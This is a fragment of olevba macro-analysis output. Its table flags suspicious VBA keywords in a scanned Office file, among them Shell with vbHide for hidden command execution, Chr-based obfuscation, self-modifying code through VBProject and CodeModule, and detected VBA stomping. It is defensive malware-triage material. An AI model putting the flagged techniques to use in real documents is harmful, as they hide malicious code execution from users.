|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

